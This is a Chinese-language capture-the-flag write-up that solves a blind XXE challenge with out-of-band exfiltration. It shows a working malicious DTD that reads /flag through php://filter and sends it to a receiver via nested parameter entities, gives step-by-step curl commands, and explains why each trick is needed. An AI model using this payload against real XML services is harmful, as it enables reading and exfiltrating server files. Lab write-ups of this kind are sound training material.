# 28-xxe-blind-oob

## 漏洞类型

Blind XXE OOB，盲 XML 外部实体注入。

XML 解析有实体展开，但响应只回 `{"ok":true/false}`，没有回显通道，必须用 OOB 把数据带出来。

题目提示：

```text
Flag 位置：/flag
XML 入口：POST /submit
DTD 托管：POST /dtd-upload  → 返回 http://127.0.0.1/dtd/<id>.dtd
OOB 接收器：GET /oob?c=<内容>
OOB 日志：GET /oob-log
```

思路：

1. 把"参数实体三段套" DTD 上传到 `/dtd-upload`，靶机托管成 `http://127.0.0.1/dtd/<id>.dtd`。
2. 给 `/submit` 提一段 XML，内联 DTD 用 `%dtd;` 引用上面的外部 DTD。
3. 解析时通过 `php://filter` 把 `/flag` base64，再用 `%out;` 发请求到 `/oob?c=<base64>`。
4. 访问 `/oob-log` 拿到 base64，本地解码。

## 手工复刻

### 1. 三探针确认环境

```bash
curl 'http://47.120.76.57:34936/oob?c=hello'
curl 'http://47.120.76.57:34936/oob-log'
curl -X POST --data '<!ENTITY x "hi">' 'http://47.120.76.57:34936/dtd-upload'
```

三条都正常（最后一条返回 `{"ok":true,"url":"http://127.0.0.1/dtd/xxx.dtd"}`）即可开打。

### 2. 上传 evil.dtd

要托管的 DTD（参数实体三段套）：

```dtd
<!ENTITY % f SYSTEM "php://filter/convert.base64-encode/resource=/flag">
<!ENTITY % ex "<!ENTITY &#x25; out SYSTEM 'http://127.0.0.1/oob?c=%f;'>">
%ex;
%out;
```

命令行复现：

```bash
curl -X POST 'http://47.120.76.57:34936/dtd-upload' \
  -H 'Content-Type: text/plain' \
  --data-binary $'<!ENTITY % f SYSTEM "php://filter/convert.base64-encode/resource=/flag">\n<!ENTITY % ex "<!ENTITY &#x25; out SYSTEM \'http://127.0.0.1/oob?c=%f;\'>">\n%ex;\n%out;\n'
```

返回里抓出 URL，例如：

```text
http://127.0.0.1/dtd/91d6122855cc.dtd
```

### 3. 提交 XML 触发解析

把上一步的 DTD URL 填进去：

```bash
curl -X POST 'http://47.120.76.57:34936/submit' \
  -H 'Content-Type: application/xml' \
  --data-binary '<?xml version="1.0"?>
<!DOCTYPE r [<!ENTITY % dtd SYSTEM "http://127.0.0.1/dtd/91d6122855cc.dtd"> %dtd;]>
<r>hi</r>'
```

返回 `{"ok":false,"msg":"parse failed"}` 是**正常的**，parser 报错前已经发出 OOB 请求。

### 4. 查看 OOB 日志并解码

```bash
curl 'http://47.120.76.57:34936/oob-log'
```

看到一行：

```text
2026-xx-xx xx:xx:xx QS=c=VE9HT0dPLWZsYWd7...fQ==
```

把 `c=` 后面那串 base64 解码：

```bash
echo 'VE9HT0dPLWZsYWd7MjAwMzA0MjAtNzk1Mi00NWY1LTgyNGQtZmRlOGI3NjYwZTI2fQ==' | base64 -d
```

即可拿到 flag：

```text
TOGOGO-flag{20030420-7952-45f5-824d-fde8b7660e26}
```

## 为什么必须用外部 DTD

XML 规范不允许"在内联 DTD 的参数实体值里再声明参数实体"，会报：

```text
PEReferences forbidden in internal subset
```

所以 `%ex` 那段三段套**必须**放到 `/dtd-upload` 托管，由 `%dtd;` 拉回来才合法。

## 为什么 `&#x25;` 不能直接写 `%`

`%` 在 DTD 里是参数实体前缀。如果直接写 `<!ENTITY % out ...>`，parser 会当场去查 `%out`（此时还没定义）报错。

写成 `&#x25;out` 后，字符引用延迟到 `%ex;` 真正展开时才解析成 `%`，这时候 `%out` 才合法地被定义出来。

## 为什么用 `php://filter` base64

flag 含 `{}-`，直接进 URL query 容易被特殊字符破坏。`php://filter/convert.base64-encode/resource=/flag` 把内容编成只有 `A-Za-z0-9+/=` 的 base64，进 URL 最安全。

## 一键脚本

见同目录 `main.py`：

```bash
source /Users/zlux/Project/Active/gkdctf/.venv/bin/activate
python /Users/zlux/Project/Active/gkdctf/28-xxe-blind-oob/main.py
```
